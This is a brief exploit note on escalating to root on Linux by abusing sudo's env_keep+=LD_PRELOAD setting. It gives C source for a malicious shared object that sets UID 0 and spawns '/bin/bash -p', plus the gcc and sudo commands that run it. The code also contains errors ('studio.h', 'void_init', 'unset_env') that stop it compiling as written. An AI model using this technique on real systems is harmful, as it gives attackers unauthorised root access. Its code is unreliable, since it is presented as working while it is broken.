LD_PRELOAD

LD_ PRELOAD is an environment variable which can be set to the path of a shared object (.so) file.

When set, the shared object will be loaded before any others. By creating a custom shared object and creating an init()
function, we can execute code as soon as the object is loaded.


preload.c
___________________________
#include <studio.h>
#include <sys/types.h>
#include <stdlib.h>

void_init()
{
unset_env("LD_PRELOAD");
setresuid(0,0,0);
system("/bin/bash -p");
}

Commands to Run Script
__________________________________________________________________
sudo -l  ( env_keep+=LD_PRELOAD need to be enable )

gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c

sudo LD_PRELOAD=/tmp/preload.so find
